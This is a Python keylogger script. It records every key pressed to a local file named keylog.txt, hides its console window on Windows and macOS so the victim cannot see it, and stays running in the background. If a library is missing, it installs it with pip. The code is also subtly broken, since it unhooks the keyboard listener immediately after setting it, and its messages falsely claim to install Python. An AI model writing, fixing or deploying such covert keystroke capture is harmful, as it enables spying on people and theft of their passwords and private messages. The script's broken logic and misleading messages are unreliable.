import subprocess
import os
import sys
import platform
import ctypes

log_file = "keylog.txt"

def on_key_press(event):
    key = event.name
    with open(log_file, "a") as f:
        f.write(key + "\n")

try:
    import keyboard
    keyboard.on_press(on_key_press)
    keyboard.unhook_all()

    # Hide the console window
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    elif platform.system() == "Darwin":
        # Hide the terminal window on macOS (experimental)
        os.system('''/usr/bin/osascript -e 'tell app "Finder" to set visible of process "Python" to false' ''')

    # Keep the script running in the background
    while True:
        pass

except ImportError:
    print("Oops! It seems like the keyboard library is not available.")
    print("Attempting to install Python and the keyboard library...")

    try:
        # Install Python
        subprocess.run(["pip", "install", "keyboard"])

        print("Python and the keyboard library have been installed successfully.")
        print("Please re-run the script to start the keylogger.")

    except Exception as e:
        print("An error occurred while installing Python and the keyboard library.")
        print("Please install Python and the keyboard library manually.")

print("Make sure you have Python installed and the keyboard library installed.")